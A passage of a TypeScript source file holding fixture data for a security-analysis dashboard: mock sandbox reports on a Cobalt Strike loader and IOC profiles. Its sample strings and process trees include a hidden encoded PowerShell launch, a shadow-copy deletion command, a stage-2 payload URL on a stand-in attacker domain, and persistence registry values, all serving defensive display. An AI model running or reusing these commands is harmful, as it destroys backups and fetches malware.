    hotkey: '4',
    tagline: '11-stage RFC 822 email forensics, auth verification, and payload inspection.',
    description: 'Uncover spoofing, lookalike domains, MTA hop anomalies, credential harvesting forms, and weaponized attachments.',
    accentFrom: '#f43f5e',
    accentTo: '#ec4899',
    defaultPort: 5002,
    apiPrefix: '/api/phishing',
    capabilities: [
      '11-stage forensic pipeline with ~40 weighted threat signals',
      'SPF, DKIM, DMARC, ARC & CompAuth verification + Identity Matrix',
      'Hop-by-hop MTA Received path & TLS encryption visualization',
      'Defanged URL redirect chains & sandboxed HTML mail preview'
    ],
    mainTabs: [
      { id: 'overview', label: 'Overview' },
      { id: 'analysis', label: 'Analysis' }
    ],
    // Bug #1 Fix: Sub-tab ID is strictly 'dashboard', never 'overview' or 'summary'
    subTabs: [
      { id: 'dashboard', label: 'Dashboard' },
      { id: 'sender-auth', label: 'Sender & Auth' },
      { id: 'artifacts', label: 'Artifacts' },
      { id: 'preview', label: 'Preview Mail' }
    ]
  },
  ruleforge: {
    id: 'ruleforge',
    name: 'RuleForge',
    shortName: 'RuleForge',
    hotkey: '5',
    tagline: 'Cross-SIEM detection engineering with refusals-over-approximations.',
    description: 'Author, translate, tune, and test detection logic across 8 SIEM dialects with a deterministic three-valued evaluation engine.',
    accentFrom: '#14b8a6',
    accentTo: '#10b981',
    defaultPort: 8765,
    apiPrefix: '/api/ruleforge',
    capabilities: [
      '8 SIEM dialects (Sentinel, Sigma, Splunk, QRadar, Elastic, Wazuh, Chronicle, CrowdStrike)',
      'Visual pipeline stage & nested AND/OR condition builder',
      'Three-valued sample runner (matched / no_match / not_evaluated)',
      'Log-to-rule synthesis, ReDoS lint & visual version lineage tree'
    ],
    // Bug #2 Fix: Second main tab ID is strictly 'workshop', never 'studio'
    mainTabs: [
      { id: 'overview', label: 'Overview' },
      { id: 'workshop', label: 'Workshop' }
    ],
    subTabs: [
      { id: 'author', label: 'Author' },
      { id: 'tune', label: 'Tune' },
      { id: 'debug', label: 'Debug' },
      { id: 'understand', label: 'Understand' },
      { id: 'history', label: 'History' },
      { id: 'dialects', label: 'Dialects' }
    ]
  }
};

// ============================================================================
// 3. FIXTURE DATA FOR ALL 5 SECURITY ENGINES (src/data/fixtures.ts)
// ============================================================================
export const FIXTURES = {
  malwareReports: [
    {
      id: 'mal-001',
      filename: 'invoice_q3.exe',
      timestamp: '2026-10-14 11:42:18 UTC',
      score: 87,
      tier: 'CRITICAL' as const,
      verdict: 'malicious' as VerdictType,
      format: 'PE32+ executable (GUI) x86-64',
      size: '1.84 MB (1,929,344 bytes)',
      detectionRatio: '52 / 71 engines',
      md5: '8f14e45fceea167a5a36dedd4bea2543',
      sha1: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4',
      sha256: 'a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b',
      ssdeep: '24576:Qp9K7wL2xR8mN4vB1tY6uI0oP3aS5dF7gH9jK:Qp9K7wL2xR8mN4vB1tY6',
      imphash: 'f34d5f2d4577ed6d9ceec516c1f5a744',
      magic: 'PE32+ executable (GUI) x86-64, for MS Windows, 6 sections',
      mitre: [
        { id: 'T1055.002', name: 'Process Injection: Portable Executable Injection', tactic: 'Defense Evasion', url: 'https://attack.mitre.org/techniques/T1055/002/' },
        { id: 'T1059.001', name: 'Command and Scripting Interpreter: PowerShell', tactic: 'Execution', url: 'https://attack.mitre.org/techniques/T1059/001/' },
        { id: 'T1071.001', name: 'Application Layer Protocol: Web Protocols', tactic: 'Command and Control', url: 'https://attack.mitre.org/techniques/T1071/001/' },
        { id: 'T1547.001', name: 'Boot or Logon Autostart Execution: Registry Run Keys', tactic: 'Persistence', url: 'https://attack.mitre.org/techniques/T1547/001/' }
      ],
      summary: 'High-confidence Cobalt Strike / AsyncRAT loader disguised as a Q3 accounting invoice executable. Exhibits high-entropy packed `.rsrc` and `.pdata` sections, classic process hollowing API imports, persistence via HKCU Run key, and encrypted C2 callbacks to 198.51.100.45:443.',
      recommendations: [
        { priority: 'CRITICAL', text: 'Isolate host WKS-FINANCE04 immediately and terminate PID 4812 (invoice_q3.exe) and child PID 6104 (rundll32.exe).' },
        { priority: 'HIGH', text: 'Block egress traffic to 198.51.100.45 and evil-login-portal.com at perimeter firewall and DNS sinkhole.' },
        { priority: 'HIGH', text: 'Sweep enterprise endpoints using the generated Sigma rule for HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefendSync.' },
        { priority: 'MEDIUM', text: 'Reset credentials for user CORP\\j.miller due to potential infostealer memory scraping.' }
      ],
      scoreBreakdown: {
        formatName: 'PE32+',
        reputation: { earned: 23, max: 25 },
        sandbox: { earned: 31, max: 35 },
        static: { earned: 33, max: 40 }
      },
      headers: {
        'Machine': '0x8664 (AMD64)',
        'Number of Sections': '6',
        'TimeDateStamp': '2026-10-12 03:14:09 UTC',
        'Entry Point': '0x00014A80 (.text)',
        'ImageBase': '0x0000000140000000',
        'Subsystem': 'IMAGE_SUBSYSTEM_WINDOWS_GUI (2)',
        'DLL Characteristics': 'DYNAMIC_BASE, HIGH_ENTROPY_VA, NX_COMPAT',
        'Digital Signature': 'Unsigned (No Authenticode certificate present)'
      },
      sections: [
        { name: '.text', vsize: '0x00048000', rsize: '0x00047A00', entropy: 6.42, flags: 'CNT_CODE | MEM_EXECUTE | MEM_READ' },
        { name: '.rdata', vsize: '0x0001B000', rsize: '0x0001AA00', entropy: 5.18, flags: 'CNT_INITIALIZED_DATA | MEM_READ' },
        { name: '.data', vsize: '0x00006000', rsize: '0x00004200', entropy: 4.11, flags: 'CNT_INITIALIZED_DATA | MEM_READ | MEM_WRITE' },
        { name: '.pdata', vsize: '0x00092000', rsize: '0x00091800', entropy: 7.89, flags: 'CNT_INITIALIZED_DATA | MEM_READ (Packed Shellcode)' },
        { name: '.rsrc', vsize: '0x00084000', rsize: '0x00083E00', entropy: 7.94, flags: 'CNT_INITIALIZED_DATA | MEM_READ (Encrypted Payload)' },
        { name: '.reloc', vsize: '0x00003000', rsize: '0x00002800', entropy: 5.02, flags: 'CNT_INITIALIZED_DATA | MEM_DISCARDABLE' }
      ],
      imports: [
        {
          dll: 'KERNEL32.dll',
          apis: [
            { name: 'VirtualAllocEx', suspicious: true, reason: 'Remote memory allocation for process injection' },
            { name: 'WriteProcessMemory', suspicious: true, reason: 'Writes payload bytes into target process' },
            { name: 'CreateRemoteThread', suspicious: true, reason: 'Executes injected code in remote process' },
            { name: 'IsDebuggerPresent', suspicious: true, reason: 'Anti-analysis debugger check' },
            { name: 'GetTickCount64', suspicious: false, reason: 'Timing check' }
          ]
        },
        {
          dll: 'WININET.dll',
          apis: [
            { name: 'InternetOpenUrlW', suspicious: true, reason: 'Direct HTTP/HTTPS C2 staging request' },
            { name: 'InternetReadFile', suspicious: true, reason: 'Reads remote stage-2 beacon stream' }
          ]
        },
        {
          dll: 'ADVAPI32.dll',
          apis: [
            { name: 'RegSetValueExW', suspicious: true, reason: 'Modifies registry keys for persistence' },
            { name: 'AdjustTokenPrivileges', suspicious: true, reason: 'Enables SeDebugPrivilege' }
          ]
        }
      ],
      yaraMatches: [
        { rule: 'MAL_CobaltStrike_Beacon_Loader_x64', source: 'SecConflux-Core-YARA', severity: 'critical', matchedStrings: ['$mz_header', '$beacon_cfg_xor = { 69 68 69 68 69 }', '$pipe_str = "\\\\\\\\.\\\\pipe\\\\MSSE-4812-server"'] },
        { rule: 'SUSP_High_Entropy_Resource_Section', source: 'Neo23x0-Signature-Base', severity: 'high', matchedStrings: ['pe.sections[4].entropy > 7.8'] },
        { rule: 'APT_Process_Hollowing_Imports', source: 'Elastic-Protections', severity: 'high', matchedStrings: ['VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread'] }
      ],
      stringsSample: [
        'https://198.51.100.45:443/api/v2/telemetry/checkin',
        'http://evil-login-portal.com/stage2/beacon_x64.bin',
        'powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA',
        'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefendSync',
        '\\\\.\\pipe\\MSSE-4812-server',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'SeDebugPrivilege',
        'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll',
        'cmd.exe /c vssadmin delete shadows /all /quiet',
        'SELECT * FROM Win32_ShadowCopy'
      ],
      vendors: [
        {
          name: 'VirusTotal',
          status: 'Malicious (52/71)',
          confidence: 96,
          classification: 'trojan.cobaltstrike/asyncrat',
          rawJson: '{\n  "data": {\n    "id": "a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b",\n    "attributes": {\n      "last_analysis_stats": { "malicious": 52, "suspicious": 4, "undetected": 15 },\n      "popular_threat_classification": { "suggested_threat_label": "trojan.cobaltstrike/beacon" }\n    }\n  }\n}'
        },
        {
          name: 'Hybrid Analysis',
          status: 'Malicious (100/100)',
          confidence: 98,
          classification: 'VX Family: CobaltStrike / Injector',
          rawJson: '{\n  "verdict": "malicious",\n  "threat_score": 100,\n  "vx_family": "CobaltStrike",\n  "mitre_attcks": ["T1055.002", "T1059.001", "T1547.001"]\n}'
        },
        {
          name: 'Hatching Triage',
          status: 'Score 9 / 10',
          confidence: 90,
          classification: 'beacon, c2-http, persistence',
          rawJson: '{\n  "sample": { "score": 9, "tags": ["family:cobaltstrike", "botnet", "persistence"] },\n  "extracted_config": { "c2": ["https://198.51.100.45:443/api/v2/telemetry/checkin"], "sleep": 60000, "jitter": 25 }\n}'
        },
        {
          name: 'FileScan.io',
          status: 'Likely Malicious',
          confidence: 88,
          classification: 'Emulated Shellcode & High Entropy PE',
          rawJson: '{\n  "verdict": "MALICIOUS",\n  "confidence": 0.88,\n  "yara_hits": 3,\n  "extracted_urls": ["https://198.51.100.45:443/api/v2/telemetry/checkin", "http://evil-login-portal.com/stage2/beacon_x64.bin"]\n}'
        }
      ],
      sandboxSignatures: [
        { title: 'Allocates executable memory in remote process (rundll32.exe)', severity: 'critical', category: 'Process Injection' },
        { title: 'Deletes Volume Shadow Copies via vssadmin.exe', severity: 'critical', category: 'Ransomware / Impact' },
        { title: 'Establishes TLS session to unverified certificate on 198.51.100.45:443', severity: 'high', category: 'Command & Control' },
        { title: 'Installs autorun registry key under HKCU\\...\\Run\\WinDefendSync', severity: 'high', category: 'Persistence' }
      ],
      communityComments: [
        { author: '@mal_hunter_soc', date: '2h ago', body: 'Observed in FinTech spearphishing campaign today. C2 198.51.100.45 uses custom Cobalt Strike malleable C2 profile mimicking telemetry checkin.' },
        { author: '@threat_intel_bot', date: '5h ago', body: 'Extracted watermark ID 135902841. Associated with initial access via macro-enabled invoice docs.' }
      ],
      processTree: [
        {
          pid: 4812,
          ppid: 3104,
          name: 'invoice_q3.exe',
          cmd: '"C:\\Users\\j.miller\\Downloads\\invoice_q3.exe"',
          user: 'CORP\\j.miller',
          risk: 'critical',
          details: 'Initial dropper execution; unpacks .rsrc payload and spawns cmd.exe + injects into rundll32.exe.',
          children: [
            {
              pid: 5290,
              ppid: 4812,
              name: 'cmd.exe',
              cmd: 'cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...',
              user: 'CORP\\j.miller',
              risk: 'high',
              details: 'Executes encoded PowerShell staging script and shadow copy deletion.',
              children: [
                {
                  pid: 5912,
                  ppid: 5290,
                  name: 'powershell.exe',
                  cmd: 'powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...',
                  user: 'CORP\\j.miller',
                  risk: 'critical',
                  details: 'Contacts http://evil-login-portal.com/stage2/beacon_x64.bin and writes sync_helper.dll.',
                  children: []
                }
              ]
            },
            {
              pid: 6104,
              ppid: 4812,
              name: 'rundll32.exe',
              cmd: 'C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll,StartWork',
              user: 'CORP\\j.miller',
              risk: 'critical',
              details: 'Hollowed host process maintaining persistent HTTPS beacon to 198.51.100.45:443.',
              children: []
            }
          ]
        }
      ],
      networkActivity: [
        { protocol: 'HTTPS', dstIp: '198.51.100.45', dstPort: 443, domain: 'c2-telemetry.evil-login-portal.com', bytes: '148.2 KB', process: 'rundll32.exe (6104)' },
        { protocol: 'HTTP', dstIp: '203.0.113.88', dstPort: 80, domain: 'evil-login-portal.com', bytes: '412.6 KB', process: 'powershell.exe (5912)' },
        { protocol: 'DNS', dstIp: '8.8.8.8', dstPort: 53, domain: 'evil-login-portal.com', bytes: '1.1 KB', process: 'powershell.exe (5912)' }
      ],
      fileActivity: [
        { action: 'CREATED', path: 'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll', process: 'powershell.exe (5912)', size: '312 KB' },
        { action: 'MODIFIED', path: 'C:\\Users\\j.miller\\AppData\\Local\\Temp\\~df8192.tmp', process: 'invoice_q3.exe (4812)', size: '64 KB' },
        { action: 'DELETED', path: 'C:\\Users\\j.miller\\Downloads\\invoice_q3.exe:Zone.Identifier', process: 'invoice_q3.exe (4812)', size: '26 B' }
      ],
      registryActivity: [
        { action: 'SET_VALUE', key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefendSync', value: 'rundll32.exe C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll,StartWork', process: 'invoice_q3.exe (4812)' },
        { action: 'SET_VALUE', key: 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\ProgramData\\Microsoft\\Vault', value: '0x00000000', process: 'powershell.exe (5912)' }
      ],
      iocs: [
        { type: 'IPs', value: '198.51.100.45', source: 'Sandbox Network / Memory Config', context: 'Primary HTTPS C2 Beacon Server (Port 443)', verdict: 'malicious' as VerdictType },
        { type: 'IPs', value: '203.0.113.88', source: 'Sandbox Network', context: 'Stage-2 Payload Hosting IP', verdict: 'malicious' as VerdictType },
        { type: 'Domains', value: 'evil-login-portal.com', source: 'PE Strings / DNS Query', context: 'Staging & Credential Harvesting Domain', verdict: 'malicious' as VerdictType },
        { type: 'URLs', value: 'https://198.51.100.45:443/api/v2/telemetry/checkin', source: 'Triage Config Extractor', context: 'Malleable C2 Checkin URI', verdict: 'malicious' as VerdictType },
        { type: 'URLs', value: 'http://evil-login-portal.com/stage2/beacon_x64.bin', source: 'PowerShell Command Line', context: 'Stage-2 Shellcode Payload URL', verdict: 'malicious' as VerdictType },
        { type: 'Hashes', value: 'a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b', source: 'Static File Hash (SHA-256)', context: 'invoice_q3.exe Primary Dropper', verdict: 'malicious' as VerdictType },
        { type: 'Registry', value: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefendSync', source: 'Behavioral Registry Monitor', context: 'User Logon Persistence Key', verdict: 'suspicious' as VerdictType },
        { type: 'Paths', value: 'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll', source: 'Filesystem Monitor', context: 'Dropped Cobalt Strike Beacon DLL', verdict: 'malicious' as VerdictType }
      ]
    },
    {
      id: 'mal-002',
      filename: 'updater_svc.dll',
      timestamp: '2026-10-14 09:15:04 UTC',
      score: 54,
      tier: 'MEDIUM' as const,
      verdict: 'suspicious' as VerdictType,
      format: 'PE32+ DLL (console) x86-64',
      size: '612 KB (626,688 bytes)',
      detectionRatio: '11 / 71 engines',
      md5: '4c9184f37cff01bcdc32dc486ec36961',
      sha1: '7c4a8d09ca3762af61e59520943dc26494f8941b',
      sha256: 'c91f7a820b44e129d8f3c6a5b2190e84d3a7f61c9e0b2d4a6f8c1e3b5d7a9f02',
      ssdeep: '12288:Lm4N8pQ1vX9zR3cT5yU7iO0aE2wS6dF:Lm4N8pQ1vX9zR3c',
      imphash: 'a12b3c4d5e6f7890123456789abcdef0',
      magic: 'PE32+ executable (DLL) (GUI) x86-64, for MS Windows',
      mitre: [
        { id: 'T1574.002', name: 'Hijack Execution Flow: DLL Side-Loading', tactic: 'Persistence', url: 'https://attack.mitre.org/techniques/T1574/002/' }
      ],
      summary: 'Unsigned third-party updater DLL exhibiting potential DLL side-loading exports and querying system environment variables. Moderate suspicion due to obfuscated string table.',
      recommendations: [
        { priority: 'MEDIUM', text: 'Verify whether updater_svc.dll belongs to an approved vendor deployment package on host WKS-DEV09.' },
        { priority: 'LOW', text: 'Monitor outbound connections from the parent application loading this library.' }
      ],
      scoreBreakdown: {
        formatName: 'PE32+ DLL',
        reputation: { earned: 12, max: 25 },
        sandbox: { earned: 18, max: 35 },
        static: { earned: 24, max: 40 }
      },
      headers: {
        'Machine': '0x8664 (AMD64)',
        'Number of Sections': '5',
        'TimeDateStamp': '2026-09-28 19:02:41 UTC',
        'Entry Point': '0x00002140 (.text)',
        'ImageBase': '0x0000000180000000',
        'Subsystem': 'IMAGE_SUBSYSTEM_WINDOWS_GUI (2)',
        'DLL Characteristics': 'DYNAMIC_BASE, NX_COMPAT',
        'Digital Signature': 'Unsigned'
      },
      sections: [
        { name: '.text', vsize: '0x00032000', rsize: '0x00031800', entropy: 6.15, flags: 'CNT_CODE | MEM_EXECUTE | MEM_READ' },
        { name: '.rdata', vsize: '0x00014000', rsize: '0x00013A00', entropy: 6.78, flags: 'CNT_INITIALIZED_DATA | MEM_READ' }
      ],
      imports: [
        {
          dll: 'KERNEL32.dll',
          apis: [
            { name: 'LoadLibraryExW', suspicious: true, reason: 'Dynamic module loading' },
            { name: 'GetEnvironmentVariableW', suspicious: false, reason: 'Reads system PATH' }
          ]
        }
      ],
      yaraMatches: [
        { rule: 'SUSP_Unsigned_Updater_DLL_Exports', source: 'SecConflux-Core-YARA', severity: 'medium', matchedStrings: ['$export_run = "ServiceMain"'] }
      ],
      stringsSample: ['ServiceMain', 'https://cdn-telemetry-check.net/v1/ping', 'SOFTWARE\\UpdaterService\\Config'],
      vendors: [
        { name: 'VirusTotal', status: 'Suspicious (11/71)', confidence: 62, classification: 'pua.packed/sideload', rawJson: '{"malicious": 11, "suspicious": 5, "undetected": 55}' },
        { name: 'Hybrid Analysis', status: 'Suspicious (55/100)', confidence: 58, classification: 'Unknown unsigned DLL', rawJson: '{"verdict": "suspicious", "threat_score": 55}' }
      ],
      sandboxSignatures: [
        { title: 'Queries proxy configuration from HKCU Internet Settings', severity: 'medium', category: 'Discovery' }
      ],
      communityComments: [],
      processTree: [
        { pid: 2210, ppid: 1040, name: 'rundll32.exe', cmd: 'rundll32.exe updater_svc.dll,ServiceMain', user: 'CORP\\a.patel', risk: 'medium', details: 'Executes exported ServiceMain entrypoint.', children: [] }
      ],
      networkActivity: [
        { protocol: 'HTTPS', dstIp: '198.51.100.201', dstPort: 443, domain: 'cdn-telemetry-check.net', bytes: '14.1 KB', process: 'rundll32.exe (2210)' }
      ],
      fileActivity: [],
      registryActivity: [],
      iocs: [
        { type: 'Domains', value: 'cdn-telemetry-check.net', source: 'Sandbox Network', context: 'Updater Checkin Endpoint', verdict: 'suspicious' as VerdictType },
        { type: 'IPs', value: '198.51.100.201', source: 'Sandbox Network', context: 'Resolved IP for cdn-telemetry-check.net', verdict: 'suspicious' as VerdictType }
      ]
    },
    {
      id: 'mal-003',
      filename: 'putty_clean.exe',
      timestamp: '2026-10-13 16:20:10 UTC',
      score: 8,
      tier: 'LOW' as const,
      verdict: 'clean' as VerdictType,
      format: 'PE32+ executable (GUI) x86-64',
      size: '1.62 MB (1,698,816 bytes)',
      detectionRatio: '0 / 71 engines',
      md5: '098f6bcd4621d373cade4e832627b4f6',
      sha1: 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3',
      sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      ssdeep: '24576:CleanPuttyHashSample12345:CleanPuttyHash',
      imphash: '11223344556677889900aabbccddeeff',
      magic: 'PE32+ executable (GUI) x86-64, signed by Simon Tatham',
      mitre: [],
      summary: 'Verified Authenticode-signed SSH/Telnet client (PuTTY 0.81). Zero YARA rule matches and 0/71 vendor detections.',
      recommendations: [
        { priority: 'LOW', text: 'No containment required. Binary matches known-good NSRL and vendor Authenticode signature.' }
      ],
      scoreBreakdown: {
        formatName: 'PE32+',
        reputation: { earned: 0, max: 25 },
        sandbox: { earned: 3, max: 35 },
        static: { earned: 5, max: 40 }
      },
      headers: {
        'Machine': '0x8664 (AMD64)',
        'Digital Signature': 'Valid (Signed by Simon Tatham, DigiCert SHA2 Assured ID)'
      },
      sections: [
        { name: '.text', vsize: '0x0009A000', rsize: '0x00099800', entropy: 6.21, flags: 'CNT_CODE | MEM_EXECUTE | MEM_READ' }
      ],
      imports: [],
      yaraMatches: [],
      stringsSample: ['PuTTY-Release-0.81', 'ssh-ed25519', 'Simon Tatham'],
      vendors: [
        { name: 'VirusTotal', status: 'Clean (0/71)', confidence: 100, classification: 'signed.known-good', rawJson: '{"malicious": 0, "harmless": 68, "undetected": 3}' }
      ],
      sandboxSignatures: [],
      communityComments: [],
      processTree: [],
      networkActivity: [],
      fileActivity: [],
      registryActivity: [],
      iocs: []
    }
  ]
};
export const MORE_FIXTURES = {
  iocProfiles: {
    '198.51.100.45': {
      ioc: '198.51.100.45',
      type: 'IPv4 Address',
      verdict: 'malicious' as VerdictType,
      score: 92,
      whyVerdict: 'Flagged as active Cobalt Strike / AsyncRAT C2 infrastructure by 19 of 28 queried intelligence providers, with recent Hudson Rock infostealer callbacks and Shodan self-signed TLS fingerprint match.',
      votes: { malicious: 19, suspicious: 4, clean: 3, unknown: 7 },
      geo: { country: 'Netherlands (NL)', city: 'Amsterdam', asn: 'AS209401 (BulletProof Hosting B.V.)', org: 'NexusCloud Infrastructure Ltd', isp: 'NexusCloud Transit', coords: '52.3676° N, 4.9041° E' },
      dns: [
        { type: 'PTR', name: '45.100.51.198.in-addr.arpa', value: 'edge-gw45.evil-login-portal.com', ttl: '300s' },
        { type: 'A', name: 'c2-telemetry.evil-login-portal.com', value: '198.51.100.45', ttl: '60s' },
        { type: 'MX', name: 'evil-login-portal.com', value: '10 mail.evil-login-portal.com', ttl: '3600s' },
        { type: 'TXT', name: 'evil-login-portal.com', value: 'v=spf1 ip4:198.51.100.0/24 ~all', ttl: '3600s' }
      ],
      ssl: {
        subject: 'CN=*.microsoft-telemetry-sync.com (Self-Signed)',
        issuer: 'CN=*.microsoft-telemetry-sync.com',
        ja3s: 'f4febc55ea12b31ae17cfb7e614afda8 (Cobalt Strike Default)',
        serial: '00:8C:91:F4:22:09:AB:14:FE',
        validFrom: '2026-09-30',
        validTo: '2027-09-30'
      },
      whois: {
        registrar: 'NameCheap / PrivacyGuardian LLC',
        created: '2026-09-29',
        expires: '2027-09-29',
        registrant: 'Redacted for Privacy (Bulletproof ASN)',
        abuseContact: 'abuse@nexuscloud-infra.example'
      },
      subdomains: [
        { fqdn: 'c2-telemetry.evil-login-portal.com', firstSeen: '2026-10-01', certIssuer: 'Self-Signed' },
        { fqdn: 'auth-sso.evil-login-portal.com', firstSeen: '2026-10-03', certIssuer: 'Let\'s Encrypt R3' },
        { fqdn: 'stage2.evil-login-portal.com', firstSeen: '2026-10-08', certIssuer: 'Let\'s Encrypt R3' }
      ],
      shodan: {
        os: 'Ubuntu Linux 22.04 LTS',
        ports: [22, 80, 443, 8443, 50050],
        services: [
          { port: 22, proto: 'tcp', banner: 'OpenSSH 8.9p1 Ubuntu-3ubuntu0.10' },
          { port: 80, proto: 'tcp', banner: 'nginx/1.18.0 (Redirect to HTTPS)' },
          { port: 443, proto: 'tcp', banner: 'HTTP/1.1 404 Not Found (Cobalt Strike Malleable C2)' },
          { port: 50050, proto: 'tcp', banner: 'Cobalt Strike TeamServer Default Port (Filtered)' }
        ],
        vulns: ['CVE-2024-6387 (regreSSHion)', 'CVE-2023-44487 (HTTP/2 Rapid Reset)']
      },
      abuseIpdb: {
        confidenceScore: 99,
        totalReports: 318,
        lastReported: '14 minutes ago',
        categories: ['C2 Server', 'Phishing Hosting', 'Port Scan', 'Brute-Force SSH']
      },
      urlscan: {
        verdict: 'Malicious — Credential Harvester / C2 Staging',
        domStats: '42 DOM nodes · 3 external scripts · 1 hidden iframe · 2 TLS redirects',
        contactedDomains: ['evil-login-portal.com', 'c2-telemetry.evil-login-portal.com', 'cdn.jsdelivr.net'],
        pageTitle: 'Microsoft 365 — Re-authenticate Session'
      },
      hudsonRock: {
        compromisedHosts: 14,
        stealerFamilies: ['LummaC2', 'RedLine', 'AsyncRAT'],
        lastInfectionDate: '2026-10-13 21:08 UTC'
      },
      providers: [
        { name: 'VirusTotal', verdict: 'malicious' as VerdictType, confidence: 96, summary: '19/91 security vendors flagged this IP as Cobalt Strike C2', latency: '184ms', status: 'queried' as const },
        { name: 'AbuseIPDB', verdict: 'malicious' as VerdictType, confidence: 99, summary: '99% abuse confidence across 318 distinct reporter networks', latency: '142ms', status: 'queried' as const },
        { name: 'Shodan', verdict: 'malicious' as VerdictType, confidence: 94, summary: 'Port 50050 & Cobalt Strike JA3S TLS fingerprint detected', latency: '220ms', status: 'queried' as const },
        { name: 'AlienVault OTX', verdict: 'malicious' as VerdictType, confidence: 91, summary: 'Included in 12 active pulses (FinTech Spearphishing Q4)', latency: '195ms', status: 'queried' as const },
        { name: 'GreyNoise', verdict: 'suspicious' as VerdictType, confidence: 82, summary: 'Classification: Malicious — Opportunistic & Targeted C2 traffic', latency: '160ms', status: 'queried' as const },
        { name: 'ThreatFox (abuse.ch)', verdict: 'malicious' as VerdictType, confidence: 98, summary: 'Matched IOC #1309481: Cobalt Strike HTTPS Beacon', latency: '118ms', status: 'queried' as const },
        { name: 'urlscan.io', verdict: 'malicious' as VerdictType, confidence: 90, summary: 'Hosts stage2 payload & Microsoft 365 credential phish', latency: '310ms', status: 'queried' as const },
        { name: 'Hudson Rock', verdict: 'malicious' as VerdictType, confidence: 89, summary: 'Observed as exfiltration C2 in 14 LummaC2 stealer logs', latency: '265ms', status: 'queried' as const },
        { name: 'Censys', verdict: 'suspicious' as VerdictType, confidence: 78, summary: 'Self-signed certificate spoofing microsoft-telemetry-sync.com', latency: '290ms', status: 'queried' as const },
        { name: 'CrowdSec CTI', verdict: 'malicious' as VerdictType, confidence: 88, summary: 'High aggression score: http-probing, c2-callback', latency: '175ms', status: 'queried' as const },
        { name: 'Pulsedive', verdict: 'malicious' as VerdictType, confidence: 92, summary: 'Risk: Critical — Linked to evil-login-portal.com', latency: '205ms', status: 'queried' as const },
        { name: 'Cloudflare Radar', verdict: 'info' as VerdictType, confidence: 60, summary: 'ASN AS209401 high-risk hosting provider', latency: '130ms', status: 'queried' as const },
        { name: 'Recorded Future', verdict: 'unknown' as VerdictType, confidence: 0, summary: 'Skipped — Enterprise API key not configured', latency: '—', status: 'skipped' as const, missingKey: 'RECORDED_FUTURE_API_KEY' },
        { name: 'Mandiant Advantage', verdict: 'unknown' as VerdictType, confidence: 0, summary: 'Skipped — Enterprise API key not configured', latency: '—', status: 'skipped' as const, missingKey: 'MANDIANT_API_KEY' }
      ],
      relationships: {
        nodes: [
          { id: '198.51.100.45', label: '198.51.100.45', type: 'IP', x: 340, y: 170, connections: 5 },
          { id: 'evil-login-portal.com', label: 'evil-login-portal.com', type: 'Domain', x: 160, y: 80, connections: 4 },
          { id: 'a4f8d91c...1e31b', label: 'invoice_q3.exe (SHA256)', type: 'Hash', x: 520, y: 85, connections: 3 },
          { id: 'https://198.51.100.45:443/api/v2/telemetry/checkin', label: '/api/v2/telemetry/checkin', type: 'URL', x: 530, y: 260, connections: 2 },
          { id: 'billing-urgent@evil-login-portal.com', label: 'billing-urgent@evil-login...', type: 'Email', x: 150, y: 265, connections: 3 },
          { id: '203.0.113.88', label: '203.0.113.88', type: 'IP', x: 340, y: 300, connections: 2 }
        ],
        edges: [
          { source: '198.51.100.45', target: 'evil-login-portal.com', relation: 'resolves_to' },
          { source: '198.51.100.45', target: 'a4f8d91c...1e31b', relation: 'c2_contacted_by' },
          { source: '198.51.100.45', target: 'https://198.51.100.45:443/api/v2/telemetry/checkin', relation: 'hosts_uri' },
          { source: 'evil-login-portal.com', target: 'billing-urgent@evil-login-portal.com', relation: 'sender_domain' },
          { source: 'evil-login-portal.com', target: '203.0.113.88', relation: 'failover_a_record' },
          { source: 'a4f8d91c...1e31b', target: 'billing-urgent@evil-login-portal.com', relation: 'delivered_by' }
        ]
      }
    },
    'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh': {
      ioc: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
      type: 'Bitcoin Wallet (Bech32)',
      verdict: 'malicious' as VerdictType,
      score: 88,
      whyVerdict: 'Wallet address is associated with ransomware extortion notes and high-risk mixing service hops across Chainalysis and Abuse.ch.',
      votes: { malicious: 14, suspicious: 3, clean: 1, unknown: 15 },
      wallet: {
        chain: 'Bitcoin (BTC)',
        balance: '4.81920411 BTC ($312,480 USD)',
        totalReceived: '19.45000000 BTC',
        txCount: 84,
        firstSeen: '2026-07-14',
        fundingSources: ['Wasabi CoinJoin Mixer (62%)', 'Extortion Victim Deposits (38%)'],
        sanctionsCheck: 'Flagged in Ransomware Extortion Cluster #8812'
      }
    },
    '+1-415-890-9912': {
      ioc: '+1-415-890-9912',
      type: 'Phone Number (E.164)',
      verdict: 'suspicious' as VerdictType,
      score: 68,
      whyVerdict: 'Non-fixed VoIP number provisioned via bulk SIP trunk; reported in 27 vishing / IT Helpdesk social engineering callbacks.',
      votes: { malicious: 6, suspicious: 11, clean: 2, unknown: 14 },
      phoneIntel: {
